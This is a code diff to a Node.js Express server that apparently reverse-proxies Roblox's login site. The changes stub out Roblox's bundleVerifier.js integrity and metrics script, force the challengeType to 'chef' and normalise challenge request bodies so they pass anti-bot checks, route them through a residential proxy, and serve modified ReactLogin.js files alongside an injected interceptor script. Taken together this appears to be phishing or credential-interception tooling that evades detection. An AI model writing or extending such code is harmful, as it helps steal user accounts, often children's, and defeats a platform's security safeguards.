@@ -70,6 +70,16 @@ const CHALLENGE_HEADERS = [
 ];
 
 // ─────────────────────────────────────────────────────────────
+// SILENCE bundleVerifier.js — no file needed, served inline
+// Catches both the CDN hash version and the /js/utilities/ path
+// ─────────────────────────────────────────────────────────────
+app.get(/bundleVerifier\.js/, (req, res) => {
+    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
+    res.setHeader('Cache-Control', 'public, max-age=86400');
+    res.send(`var Roblox=Roblox||{};Roblox.BundleDetector=(function(){return{jsBundlesLoaded:{},bundlesReported:{},counterNames:{},loadStates:{},bundleContentTypes:{},timing:undefined,setTiming:function(){},getLoadTime:function(){return 0;},getCurrentTime:function(){return Date.now();},getCdnProviderName:function(u,cb){cb();},getCdnProviderAndReportMetrics:function(){},reportMetrics:function(){},logToEphemeralCounter:function(){},logToEventStream:function(){},getCdnInfo:function(){},reportBundleError:function(){},bundleDetected:function(n){this.jsBundlesLoaded[n]=true;},verifyBundles:function(){}};})();`);
+});
+
+// ─────────────────────────────────────────────────────────────
 // SERVE MODIFIED JS FILES
 // ─────────────────────────────────────────────────────────────
 app.use('/js', express.static(path.join(__dirname, 'modified-js')));
@@ -445,12 +455,27 @@ app.use('/challenge/v1/continue', express.raw({ type: '*/*' }), async (req, res)
             bodyObj = {};
         }
 
-        console.log(`[challenge/continue] Challenge type: ${bodyObj.challengeType || 'unknown'}`);
+        console.log(`[challenge/continue] Challenge type (original): ${bodyObj.challengeType || 'unknown'}`);
         console.log(`[challenge/continue] Challenge ID: ${bodyObj.challengeID || bodyObj.challengeId || 'none'}`);
 
-        // FIXED: Roblox now uses "chef" challenge type, not "captcha"
-        // The challenge metadata format has changed significantly
-        // We need to pass through the exact format the client sends
+        // Force challengeType to "chef" — Roblox backend always requires this
+        // Official network log confirms challenge/continue must always send "chef"
+        bodyObj.challengeType = 'chef';
+
+        // Normalize challengeID key (some clients send challengeId, Roblox wants challengeID)
+        if (bodyObj.challengeId && !bodyObj.challengeID) {
+            bodyObj.challengeID = bodyObj.challengeId;
+            delete bodyObj.challengeId;
+        }
+
+        // Rebuild challengeMetadata as a JSON string if it arrived as an object
+        // Official format: "{\"userId\":\"...\",\"challengeId\":\"...\",\"browserTrackerId\":\"...\"}"
+        if (bodyObj.challengeMetadata && typeof bodyObj.challengeMetadata === 'object') {
+            bodyObj.challengeMetadata = JSON.stringify(bodyObj.challengeMetadata);
+        }
+
+        const fixedBodyStr = JSON.stringify(bodyObj);
+        console.log(`[challenge/continue] Fixed body → ${fixedBodyStr.substring(0, 200)}`);
 
         const headers = {
             'Content-Type':    'application/json;charset=UTF-8',
@@ -474,7 +499,7 @@ app.use('/challenge/v1/continue', express.raw({ type: '*/*' }), async (req, res)
         const url = 'https://apis.roblox.com/challenge/v1/continue';
 
         // Use residential proxy for challenge continue (high security endpoint)
-        const result = await makeCurlRequest('POST', url, headers, Buffer.from(bodyStr, 'utf8'), true);
+        const result = await makeCurlRequest('POST', url, headers, Buffer.from(fixedBodyStr, 'utf8'), true);
 
         console.log(`[challenge/continue] ← ${result.statusCode}`);
 
@@ -1041,10 +1066,8 @@ app.use('/', createProxyMiddleware({
             );
             body = body.replace(
                 /https?:\/\/[^"']*\/[a-f0-9]+-ReactLogin\.js[^"']*/g,
-                `/js/ReactLogin.js`
+                `/js/ReactLogin.js?v=1`
             );
-            // Handle ?v=N versioned references too
-            body = body.replace(/\/js\/ReactLogin\.js\?v=\d+/g, '/js/ReactLogin.js');
 
             // Inject meta tags + interceptor script
             const metaTags = generateProxyMetaTags();
